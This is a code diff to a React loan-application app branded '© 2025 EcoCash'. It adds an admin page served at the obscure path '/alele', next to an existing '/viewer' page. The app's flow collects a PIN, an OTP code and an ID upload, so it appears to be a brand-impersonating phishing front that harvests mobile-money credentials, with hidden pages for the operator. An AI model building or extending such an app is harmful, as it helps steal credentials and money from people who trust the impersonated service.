@@ -11,6 +11,7 @@ import { OtpScreen } from './components/OtpScreen';
 import { IdUploadScreen } from './components/IdUploadScreen';
 import { ConfirmationScreen } from './components/ConfirmationScreen';
 import { SubmittedScreen } from './components/SubmittedScreen';
+import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
 import { calculateMonthlyPayment } from './utils/calculator';
@@ -40,6 +41,7 @@ export default function App() {
     const validSteps: AppStep[] = ['calculator', 'step1', 'step2', 'step3', 'success', 'pin', 'verification', 'otp', 'loading', 'confirmation', 'idUpload', 'submitted'];
     return stored && validSteps.includes(stored as AppStep) ? (stored as AppStep) : 'calculator';
   });
+  const [isAdminView, setIsAdminView] = useState<boolean>(() => window.location.pathname === '/alele');
   const [isViewerView, setIsViewerView] = useState<boolean>(() => window.location.pathname === '/viewer');
   const [formData, setFormData] = useState<LoanFormData>(initialFormData);
   const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(() => {
@@ -147,7 +149,9 @@ export default function App() {
 
   useEffect(() => {
     const handlePopState = () => {
+      const newIsAdmin = window.location.pathname === '/alele';
       const newIsViewer = window.location.pathname === '/viewer';
+      setIsAdminView(newIsAdmin);
       setIsViewerView(newIsViewer);
     };
     window.addEventListener('popstate', handlePopState);
@@ -176,6 +180,7 @@ export default function App() {
 
   const navigateToApp = () => {
     window.history.pushState({}, '', '/');
+    setIsAdminView(false);
     setIsViewerView(false);
   };
 
@@ -279,6 +284,20 @@ export default function App() {
     }
   };
 
+
+  if (isAdminView) {
+    return (
+      <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
+        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
+        <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
+          <AdminPage onBackToApp={navigateToApp} />
+        </main>
+        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
+          &copy; 2025 EcoCash
+        </footer>
+      </div>
+    );
+  }
 
   if (currentStep === 'loading') {
     return (
